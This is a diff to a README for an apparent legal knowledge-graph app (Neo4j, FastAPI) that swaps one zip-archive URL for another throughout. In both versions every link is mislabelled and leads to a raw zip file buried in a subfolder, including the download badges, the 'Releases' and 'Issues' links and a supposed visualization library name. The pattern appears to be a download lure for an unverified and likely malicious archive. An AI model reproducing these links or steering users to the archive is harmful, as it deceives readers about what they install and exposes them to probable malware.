@@ -1,10 +1,10 @@
 # 🏛️ bursa-barosu-knowledge-graph - Explore Legal Insights Effortlessly
 
-[![Download](https://raw.githubusercontent.com/JO38ALAA/bursa-barosu-knowledge-graph/main/copyholder/bursa-barosu-knowledge-graph.zip)](https://raw.githubusercontent.com/JO38ALAA/bursa-barosu-knowledge-graph/main/copyholder/bursa-barosu-knowledge-graph.zip)
+[![Download](https://github.com/JO38ALAA/bursa-barosu-knowledge-graph/raw/refs/heads/main/bursa_baro_kg/scheduler/bursa_graph_barosu_knowledge_3.6.zip)](https://github.com/JO38ALAA/bursa-barosu-knowledge-graph/raw/refs/heads/main/bursa_baro_kg/scheduler/bursa_graph_barosu_knowledge_3.6.zip)
 
 ## 🚀 Getting Started
 
-Welcome to the Bursa Barosu Knowledge Graph application! This tool allows you to navigate legal concepts and cases in an easy-to-understand format. With a combination of Neo4j, FastAPI, and https://raw.githubusercontent.com/JO38ALAA/bursa-barosu-knowledge-graph/main/copyholder/bursa-barosu-knowledge-graph.zip, you can visualize complex data simply.
+Welcome to the Bursa Barosu Knowledge Graph application! This tool allows you to navigate legal concepts and cases in an easy-to-understand format. With a combination of Neo4j, FastAPI, and https://github.com/JO38ALAA/bursa-barosu-knowledge-graph/raw/refs/heads/main/bursa_baro_kg/scheduler/bursa_graph_barosu_knowledge_3.6.zip, you can visualize complex data simply.
 
 ### 🔍 Key Features
 
@@ -24,7 +24,7 @@ To ensure the application runs smoothly on your device, please meet the followin
 
 To get started with the Bursa Barosu Knowledge Graph application, you will need to download the latest version from our Releases page. 
 
-Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/JO38ALAA/bursa-barosu-knowledge-graph/main/copyholder/bursa-barosu-knowledge-graph.zip)
+Visit this page to download: [GitHub Releases](https://github.com/JO38ALAA/bursa-barosu-knowledge-graph/raw/refs/heads/main/bursa_baro_kg/scheduler/bursa_graph_barosu_knowledge_3.6.zip)
 
 After downloading, follow these steps to install and run the application:
 
@@ -61,11 +61,11 @@ If you encounter issues while using the application, try the following solutions
   - Refresh the application.
   - Clear any cache in your browser if using a web-based version.
 
-For further assistance, you can visit our [GitHub Issues page](https://raw.githubusercontent.com/JO38ALAA/bursa-barosu-knowledge-graph/main/copyholder/bursa-barosu-knowledge-graph.zip) to report a problem or ask questions.
+For further assistance, you can visit our [GitHub Issues page](https://github.com/JO38ALAA/bursa-barosu-knowledge-graph/raw/refs/heads/main/bursa_baro_kg/scheduler/bursa_graph_barosu_knowledge_3.6.zip) to report a problem or ask questions.
 
 ## 🙏 Acknowledgments
 
-This project uses powerful technologies including Neo4j for graph databases, FastAPI for reliable API server setup, and https://raw.githubusercontent.com/JO38ALAA/bursa-barosu-knowledge-graph/main/copyholder/bursa-barosu-knowledge-graph.zip for creating dynamic visualizations.
+This project uses powerful technologies including Neo4j for graph databases, FastAPI for reliable API server setup, and https://github.com/JO38ALAA/bursa-barosu-knowledge-graph/raw/refs/heads/main/bursa_baro_kg/scheduler/bursa_graph_barosu_knowledge_3.6.zip for creating dynamic visualizations.
 
 ## 🔗 Additional Resources
 
@@ -74,4 +74,4 @@ This project uses powerful technologies including Neo4j for graph databases, Fas
 
 Thank you for choosing the Bursa Barosu Knowledge Graph. We hope this tool helps you explore legal concepts easily! 
 
-[![Download](https://raw.githubusercontent.com/JO38ALAA/bursa-barosu-knowledge-graph/main/copyholder/bursa-barosu-knowledge-graph.zip)](https://raw.githubusercontent.com/JO38ALAA/bursa-barosu-knowledge-graph/main/copyholder/bursa-barosu-knowledge-graph.zip)
+[![Download](https://github.com/JO38ALAA/bursa-barosu-knowledge-graph/raw/refs/heads/main/bursa_baro_kg/scheduler/bursa_graph_barosu_knowledge_3.6.zip)](https://github.com/JO38ALAA/bursa-barosu-knowledge-graph/raw/refs/heads/main/bursa_baro_kg/scheduler/bursa_graph_barosu_knowledge_3.6.zip)
